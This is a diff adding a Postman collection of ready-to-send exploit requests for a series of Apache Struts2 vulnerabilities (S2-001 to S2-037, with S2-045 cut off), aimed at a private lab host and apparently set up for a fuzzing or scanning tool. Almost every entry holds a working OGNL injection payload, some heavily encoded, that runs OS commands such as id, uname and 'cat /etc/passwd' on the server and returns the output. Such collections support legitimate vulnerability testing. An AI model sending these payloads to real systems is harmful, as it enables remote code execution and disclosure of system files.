@@ -1,0 +1,754 @@
+{
+	"info": {
+		"_postman_id": "be77ae2a-9b6c-41b5-959c-3e560e6c04ca",
+		"name": "Struts2",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "25590513"
+	},
+	"item": [
+		{
+			"name": "S2-001",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,19",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,19",
+						"type": "text"
+					},
+					{
+						"key": "BenchmarkTest01501",
+						"value": "",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "username=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22pwd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22pwd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-001/login.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-001",
+						"login.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-003",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,18",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,18",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-003/index.action?(%27\\u0023context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\u003dfalse%27)(bla)(bla)&(%27\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)&(%27\\u0023mycmd\\u003d\\%27id\\%27%27)(bla)(bla)&(%27\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)%27)(bla)(bla)&(A)((%27\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())%27)(bla))&(B)((%27\\u0023myres\\u003dnew\\40byte[51020]%27)(bla))&(C)((%27\\u0023mydat.readFully(\\u0023myres)%27)(bla))&(D)((%27\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)%27)(bla))&(%27\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)&(E)((%27\\u0023myout.getWriter().println(\\u0023mystr)%27)(bla))",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-003",
+						"index.action"
+					],
+					"query": [
+						{
+							"key": "(%27\\u0023context[\\%27xwork.MethodAccessor.denyMethodExecution\\%27]\\u003dfalse%27)(bla)(bla)",
+							"value": null
+						},
+						{
+							"key": "(%27\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)",
+							"value": null
+						},
+						{
+							"key": "(%27\\u0023mycmd\\u003d\\%27id\\%27%27)(bla)(bla)",
+							"value": null
+						},
+						{
+							"key": "(%27\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)%27)(bla)(bla)",
+							"value": null
+						},
+						{
+							"key": "(A)((%27\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())%27)(bla))",
+							"value": null
+						},
+						{
+							"key": "(B)((%27\\u0023myres\\u003dnew\\40byte[51020]%27)(bla))",
+							"value": null
+						},
+						{
+							"key": "(C)((%27\\u0023mydat.readFully(\\u0023myres)%27)(bla))",
+							"value": null
+						},
+						{
+							"key": "(D)((%27\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)%27)(bla))",
+							"value": null
+						},
+						{
+							"key": "(%27\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)",
+							"value": null
+						},
+						{
+							"key": "(E)((%27\\u0023myout.getWriter().println(\\u0023mystr)%27)(bla))",
+							"value": null
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-005",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,17",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,17",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-005/example/HelloWorld.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-005",
+						"example",
+						"HelloWorld.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-007",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,16",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,16",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "name=springkill&email=springkill&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dnew+java.lang.Boolean%28%22false%22%29%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27cat+%2Fetc%2Fpasswd%27%29.getInputStream%28%29%29%29+%2B+%27"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-007/user.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-007",
+						"user.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-008",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,15",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,15",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-008/devmode.action?debug=command&expression=%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28\"false\"%29%20%2C%23context%5B\"xwork.MethodAccessor.denyMethodExecution\"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%29%29",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-008",
+						"devmode.action"
+					],
+					"query": [
+						{
+							"key": "debug",
+							"value": "command"
+						},
+						{
+							"key": "expression",
+							"value": "%28%23_memberAccess%5B\"allowStaticMethodAccess\"%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28\"false\"%29%20%2C%23context%5B\"xwork.MethodAccessor.denyMethodExecution\"%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%29%29"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-012",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/x-www-form-urlencoded",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,14",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,14",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D"
+				},
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-012/user.action",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-012",
+						"user.action"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-013",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,12",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,12",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-013/link.action?xxxx=%78%78%78%78%3d%25%7b%28%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%75%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%29%29%7d",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-013",
+						"link.action"
+					],
+					"query": [
+						{
+							"key": "xxxx",
+							"value": "%78%78%78%78%3d%25%7b%28%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%75%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%29%29%7d"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-014",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,13",
+						"type": "text"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,13",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-013/link.action?a=%24%7b%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%75%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%29%7d",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-013",
+						"link.action"
+					],
+					"query": [
+						{
+							"key": "a",
+							"value": "%24%7b%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%6f%75%74%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%6f%75%74%2e%63%6c%6f%73%65%28%29%29%7d"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-015",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"user-agent": true,
+					"accept-encoding": true,
+					"connection": true
+				}
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,11",
+						"type": "text",
+						"disabled": true
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,11",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-015/param.action?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-015",
+						"param.action"
+					],
+					"query": [
+						{
+							"key": "message",
+							"value": "%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-016",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,10"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,10",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-016/index.action?redirect%3a%24%7b%23%63%6f%6e%74%65%78%74%5b%22%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%22%5d%3d%66%61%6c%73%65%2c%23%66%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%29%2c%23%66%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%66%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%75%6e%61%6d%65%20%2d%61%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%67%65%6e%78%6f%72%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%67%65%6e%78%6f%72%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%67%65%6e%78%6f%72%2e%66%6c%75%73%68%28%29%2c%23%67%65%6e%78%6f%72%2e%63%6c%6f%73%65%28%29%7d",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-016",
+						"index.action"
+					],
+					"query": [
+						{
+							"key": "redirect%3a%24%7b%23%63%6f%6e%74%65%78%74%5b%22%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%22%5d%3d%66%61%6c%73%65%2c%23%66%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%29%2c%23%66%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%66%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%75%6e%61%6d%65%20%2d%61%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%62%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%61%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%5d%2c%23%63%2e%72%65%61%64%28%23%64%29%2c%23%67%65%6e%78%6f%72%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%22%29%2e%67%65%74%57%72%69%74%65%72%28%29%2c%23%67%65%6e%78%6f%72%2e%70%72%69%6e%74%6c%6e%28%23%64%29%2c%23%67%65%6e%78%6f%72%2e%66%6c%75%73%68%28%29%2c%23%67%65%6e%78%6f%72%2e%63%6c%6f%73%65%28%29%7d",
+							"value": ""
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-032",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,10"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,10",
+						"disabled": true
+					},
+					{
+						"key": "Content-Type",
+						"value": "%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('xcalc')}"
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-032/index.action?",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-032",
+						"index.action"
+					],
+					"query": [
+						{
+							"key": "",
+							"value": ""
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-037",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "request,6"
+					},
+					{
+						"key": "x-xfuzz-enabled",
+						"value": "inspect,6",
+						"disabled": true
+					}
+				],
+				"url": {
+					"raw": "http://192.168.199.130:8080/S2-037/orders/3/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=id",
+					"protocol": "http",
+					"host": [
+						"192",
+						"168",
+						"199",
+						"130"
+					],
+					"port": "8080",
+					"path": [
+						"S2-037",
+						"orders",
+						"3",
+						"%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json"
+					],
+					"query": [
+						{
+							"key": "command",
+							"value": "id"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "S2-045",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
